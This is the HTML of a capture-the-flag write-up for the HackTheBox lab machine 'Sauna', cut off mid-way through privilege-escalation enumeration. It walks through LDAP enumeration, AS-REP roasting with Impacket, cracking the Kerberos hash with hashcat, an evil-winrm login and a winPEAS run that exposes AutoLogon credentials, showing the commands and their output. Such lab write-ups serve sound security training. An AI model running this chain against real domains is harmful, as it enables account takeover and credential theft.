@@ -1,0 +1,288 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="DezeStijn"><meta name=description content="Write-up of the Sauna machine by egotisticalSW on HackTheBox.eu."><meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,egotisticalSW,Machine,Sauna"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://sequr.be/blog/2020/04/sauna/><title>Sauna :: Sequr
+</title><link rel=stylesheet href=https://sequr.be/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css integrity="sha256-JEGDzeGjjgsI+CwReRGBKI+arBzJYYzW9OnncQxXaLo=" crossorigin=anonymous><link rel=stylesheet type=text/css href=https://sequr.be/css/table.css><link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css><link rel=stylesheet type=text/css href=https://sequr.be/css/background.css><link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png><link rel=manifest href=https://sequr.be/site.webmanifest><link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://sequr.be/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Sauna"><meta itemprop=description content="Write-up of the Sauna machine by egotisticalSW on HackTheBox.eu."><meta itemprop=datePublished content="2020-04-21T20:08:57+02:00"><meta itemprop=dateModified content="2020-07-24T00:00:00+00:00"><meta itemprop=wordCount content="1230"><meta itemprop=image content="https://sequr.be/img/htb-sauna.png"><meta itemprop=keywords content="HackTheBox.eu,EgotisticalSW,Machine,Sauna"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-sauna.png"><meta name=twitter:title content="Sauna"><meta name=twitter:description content="Write-up of the Sauna machine by egotisticalSW on HackTheBox.eu."><meta property="article:section" content="Hack The Box"><meta property="article:section" content="Writeup"><meta property="article:published_time" content="2020-04-21 20:08:57 +0200 CEST"><link rel=webmention href=https://webmention.io/sequr.be/webmention></head><body><div class=container><header class=header><span class=header__inner><a href=https://sequr.be/ style=text-decoration:none><div class=logo><span class=logo__mark>$</span>
+<span class=logo__text>lynx sequr.be</span>
+<span class=logo__cursor style=background-color:#e68101></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class="post h-entry"><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+6 minutes</p></div><article><h1 class="post-title p-name"><a href=https://sequr.be/blog/2020/04/sauna/ class=u-url>Sauna</a></h1><div class="post-content e-content"><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info <a href=#machine-info>¶</a></h2><p>Traverxec [by <a href=https://www.hackthebox.eu/home/users/profile/94858 target=_blank rel=noopener>egotisticalSW</a>]<br>IP: 10.10.10.175<br>OS: Windows<br>Difficulty: Easy<br>Release: 15 Feb 2020<br>Retired: TBD</p><h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -v -sV -sC -oA scans/nmap_sauna 10.10.10.175
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.175
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.083s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>988</span> filtered ports
+</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
+</span></span><span style=display:flex><span>53/tcp   open  domain?
+</span></span><span style=display:flex><span>| fingerprint-strings: 
+</span></span><span style=display:flex><span>|   DNSVersionBindReqTCP: 
+</span></span><span style=display:flex><span>|     version
+</span></span><span style=display:flex><span>|_    bind
+</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;Egotistical Bank :: Home&#34;</span>
+</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#f92672>(</span>server time: 2020-04-14 04:55:07Z<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
+</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
+</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
+</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style=display:flex><span>SF-Port53-TCP:V<span style=color:#f92672>=</span>7.80%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>4/13%Time<span style=color:#f92672>=</span>5E94D0FD%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>DNSV
+</span></span><span style=display:flex><span>SF:ersionBindReqTCP,20,<span style=color:#e6db74>&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x04bind\0\0\x10\0\x03&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>|_clock-skew: 8h02m57s
+</span></span><span style=display:flex><span>| smb2-security-mode: 
+</span></span><span style=display:flex><span>|   2.02: 
+</span></span><span style=display:flex><span>|_    Message signing enabled and required
+</span></span><span style=display:flex><span>| smb2-time: 
+</span></span><span style=display:flex><span>|   date: 2020-04-14T04:57:25
+</span></span><span style=display:flex><span>|_  start_date: N/A
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Mon Apr 13 22:56:35 2020 -- 1 IP address (1 host up) scanned in 301.13 seconds</span>
+</span></span></code></pre></div><p>OK, there are some interesting services here:</p><ul><li>DNS (bind)</li><li>HTTP (IIS 10.0)</li><li>Kerberos</li><li>SMB</li><li>LDAP</li></ul><h3 id=smb>SMB <a href=#smb>¶</a></h3><p>Let&rsquo;s try to enumerate SMB shares as Guest (since we don&rsquo;t have any creds, yet).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo smbmap -L -H 10.10.10.175 -u guest
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Finding open SMB ports....
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Authentication error occured
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> SMB SessionError: STATUS_ACCOUNT_DISABLED<span style=color:#f92672>(</span>The referenced account is currently disabled and may not be logged on to.<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Authentication error on 10.10.10.175
+</span></span></code></pre></div><p>No luck here.</p><h3 id=ldap>LDAP <a href=#ldap>¶</a></h3><p>Let&rsquo;s enumerate LDAP.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -v -sV --script ldap* -p <span style=color:#ae81ff>389</span> -oA scans/nmap_sauna_ldap 10.10.10.175
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.175
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.045s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT    STATE SERVICE VERSION
+</span></span><span style=display:flex><span>389/tcp open  ldap    Microsoft Windows Active Directory LDAP <span style=color:#f92672>(</span>Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ldap-brute:
+</span></span><span style=display:flex><span>|   root:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   admin:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   administrator:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   webadmin:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   sysadmin:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   netadmin:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   guest:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   user:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|   web:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>|_  test:&lt;empty&gt; <span style=color:#f92672>=</span>&gt; Valid credentials
+</span></span><span style=display:flex><span>| ldap-rootdse:
+</span></span><span style=display:flex><span>| LDAP Results
+</span></span><span style=display:flex><span>|   &lt;ROOT&gt;
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>|       serverName: CN<span style=color:#f92672>=</span>SAUNA,CN<span style=color:#f92672>=</span>Servers,CN<span style=color:#f92672>=</span>Default-First-Site-Name,CN<span style=color:#f92672>=</span>Sites,CN<span style=color:#f92672>=</span>Configuration,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>| ldap-search:
+</span></span><span style=display:flex><span>|   Context: DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>|         name: EGOTISTICAL-BANK
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>|         dc: EGOTISTICAL-BANK
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Users,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Computers,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: OU<span style=color:#f92672>=</span>Domain Controllers,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>System,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>LostAndFound,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Infrastructure,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>ForeignSecurityPrincipals,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Program Data,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>NTDS Quotas,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Managed Service Accounts,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Keys,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>TPM Devices,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|     dn: CN<span style=color:#f92672>=</span>Builtin,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>|_    dn: CN<span style=color:#f92672>=</span>Hugo Smith,DC<span style=color:#f92672>=</span>EGOTISTICAL-BANK,DC<span style=color:#f92672>=</span>LOCAL
+</span></span><span style=display:flex><span>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>We find the user <code>Hugo Smith</code> and the domain name <code>egotistical-bank.local</code>.</p><h3 id=http>HTTP <a href=#http>¶</a></h3><p>Let&rsquo;s have a look at the website as well.</p><p>There&rsquo;s nothing really interesting on the site, except for the About page.</p><figure class=center><img src=https://sequr.be/img/htb-sauna-about.png><figcaption class=center>About page</figcaption></figure><p>We could try to make a userlist from the names on this page.
+Perhaps we find one or more valid usernames?</p><p>Typical username formats are <code>first.last</code> or <code>f.last</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat findings/users.txt 
+</span></span><span style=display:flex><span>fsmith
+</span></span><span style=display:flex><span>hbear
+</span></span><span style=display:flex><span>skerb
+</span></span><span style=display:flex><span>scoins
+</span></span><span style=display:flex><span>btaylor
+</span></span><span style=display:flex><span>sdriver
+</span></span><span style=display:flex><span>fergus.smith
+</span></span><span style=display:flex><span>hugo.bear
+</span></span><span style=display:flex><span>steven.kerb
+</span></span><span style=display:flex><span>shaun.coins
+</span></span><span style=display:flex><span>bowie.taylor
+</span></span><span style=display:flex><span>sophie.driver
+</span></span></code></pre></div><h2 id=initial-foothold>Initial foothold <a href=#initial-foothold>¶</a></h2><h3 id=kerberos-ticket-granting-tickets-tgt>Kerberos Ticket Granting Tickets (TGT) <a href=#kerberos-ticket-granting-tickets-tgt>¶</a></h3><p>Let&rsquo;s test our list of (potential) usernames and extract TGT to crack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ /opt/impacket/examples/GetNPUsers.py
+</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#ae81ff>2019</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>usage: GetNPUsers.py <span style=color:#f92672>[</span>-h<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-request<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-outputfile OUTPUTFILE<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                     <span style=color:#f92672>[</span>-format <span style=color:#f92672>{</span>hashcat,john<span style=color:#f92672>}]</span> <span style=color:#f92672>[</span>-usersfile USERSFILE<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-debug<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                     <span style=color:#f92672>[</span>-hashes LMHASH:NTHASH<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-no-pass<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-k<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-aesKey hex key<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                     <span style=color:#f92672>[</span>-dc-ip ip address<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                     target
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Queries target domain <span style=color:#66d9ef>for</span> users with <span style=color:#e6db74>&#39;Do not require Kerberos
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>preauthentication&#39;</span> set and export their TGTs <span style=color:#66d9ef>for</span> cracking
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ /opt/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile findings/users.txt -outputfile findings/hash.txt -dc-ip 10.10.10.175
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ cat findings/hash.txt 
+</span></span><span style=display:flex><span>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:36dff4a5bb03d0af2ac79d3e801634e3$06ec21d9b686ea6e5b8e9b04753f576fd97c366a94087d1fe7b83122668508301ad131f4e51185a6254ffe8ae6c7587252392046dec2336398d44bc1fb34ada25f71b52682b8921fcd1254d01d3e8dc48db0c6f864d43c3f88c34580fdd6e0789d521fccbb40d3d20eec877dfd37f851681edeafb14c494134ef4e3853a9f52441416b368088482be02adecb1905514a10aa98efeb75f9bf431606a720742d6fda29e124f3ab4744dd9df72fa134ab0bc8414b720a6a3ea4532a71432748470912c59c0048b0d13181939ec0813e42efff4680fb47aff623d3e0c757b0a195eab08b5dbbd430b14e233338758f8020cabb784f4576f4e9e42d0f327d55430fa3
+</span></span></code></pre></div><p>Looks like we discovered the username <code>fsmith</code> and managed to get a TGT.</p><p>Cracking this ticket, we get the password <code>Thestrokes23</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>18200</span> findings/hash.txt /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:36dff4a5bb03d0af2ac79d3e801634e3$06ec21d9b686ea6e5b8e9b04753f576fd97c366a94087d1fe7b83122668508301ad131f4e51185a6254ffe8ae6c7587252392046dec2336398d44bc1fb34ada25f71b52682b8921fcd1254d01d3e8dc48db0c6f864d43c3f88c34580fdd6e0789d521fccbb40d3d20eec877dfd37f851681edeafb14c494134ef4e3853a9f52441416b368088482be02adecb1905514a10aa98efeb75f9bf431606a720742d6fda29e124f3ab4744dd9df72fa134ab0bc8414b720a6a3ea4532a71432748470912c59c0048b0d13181939ec0813e42efff4680fb47aff623d3e0c757b0a195eab08b5dbbd430b14e233338758f8020cabb784f4576f4e9e42d0f327d55430fa3:Thestrokes23
+</span></span></code></pre></div><h3 id=user-flag>User flag <a href=#user-flag>¶</a></h3><p>We can use these credentials to login onto the box.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 
+</span></span><span style=display:flex><span>Evil-WinRM shell v2.3
+</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>ocuments&gt;cd ../Desktop
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>esktop&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>esktop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
+</span></span><span style=display:flex><span>----                -------------         ------ ----
+</span></span><span style=display:flex><span>-a----        1/23/2020  10:03 AM             <span style=color:#ae81ff>34</span> user.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>esktop&gt; type user.txt
+</span></span><span style=display:flex><span>1b5520b98d97cf17f24122a55baf70cf
+</span></span></code></pre></div><h2 id=privilege-escalation>Privilege escalation <a href=#privilege-escalation>¶</a></h2><h3 id=enumerate>Enumerate <a href=#enumerate>¶</a></h3><p>Let&rsquo;s enumerate a bit further.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>ocuments&gt; net user
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User accounts <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>\\</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
+</span></span><span style=display:flex><span>Administrator            FSmith                   Guest
+</span></span><span style=display:flex><span>HSmith                   krbtgt                   svc_loanmgr
+</span></span></code></pre></div><p>We find more usernames: <code>HSmith</code>, <code>svc_loanmgr</code> and (of course <code>Administrator</code>).</p><p>We can also use <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS title="Windows Privilege Escalation Awesome Scripts" target=_blank rel=noopener>winPEAS</a> to collect more information.<br>Upload the .exe to the box and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>ocuments&gt; upload /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
+</span></span><span style=display:flex><span>Info: Uploading /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe to C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>ocuments<span style=color:#ae81ff>\w</span>inPEAS.exe
+</span></span><span style=display:flex><span>Data: <span style=color:#ae81ff>321536</span> bytes of <span style=color:#ae81ff>321536</span> bytes copied
+</span></span><span style=display:flex><span>Info: Upload successful!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\D</span>ocuments&gt; ./winPEAS.exe
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Looking <span style=color:#66d9ef>for</span> AutoLogon credentials<span style=color:#f92672>(</span>T1012<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    Some AutoLogon credentials were found!!
+</span></span><span style=display:flex><span>    DefaultDomainName             :  EGOTISTICALBANK
+</span></span><span style=display:flex><span>    DefaultUserName               :  EGOTISTICALBANK<span style=color:#ae81ff>\s</span>vc_loanmanager
+</span></span><span style=display:flex><span>    DefaultPassword               :  Moneymakestheworldgoround!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Home folders found<span style=color:#f92672>(</span>T1087&amp;T1083&amp;T1033<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>ll Users
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\D</span>efault
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\D</span>efault User
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\P</span>ublic
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\s</span>vc_loanmgr
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Looking AppCmd.exe<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>   <span style=color:#f92672>[</span>?<span style=color:#f92672>]</span>  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+</span></span><span style=display:flex><span>    AppCmd.exe was found in C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\i</span>netsrv<span style=color:#ae81ff>\a</span>ppcmd.exe You should try to search <span style=color:#66d9ef>for</span> credentials
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking <span style=color:#66d9ef>for</span> DPAPI Master Keys<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>   <span style=color:#f92672>[</span>?<span style=color:#f92672>]</span>  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+</span></span><span style=display:flex><span>    MasterKey: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\F</span>Smith<span style=color:#ae81ff>\A</span>ppData<span style=color:#ae81ff>\R</span>oaming<span style=color:#ae81ff>\M</span>icrosoft<span style=color:#ae81ff>\P</span>rotect<span style=color:#ae81ff>\S</span>-1-5-21-2966785786-3096785034-1186376766-1105<span style=color:#ae81ff>\c</span>a6bc5b5-57d3-4f19-9f5a-3016d1e57c8f
+</span></span><span style=display:flex><span>    Accessed: 1/24/2020 6:30:19 AM
+</span></span><span style=display:flex><span>    Modified: 1/24/2020 6:30:19 AM
+</span></span><span style=display:flex><span>
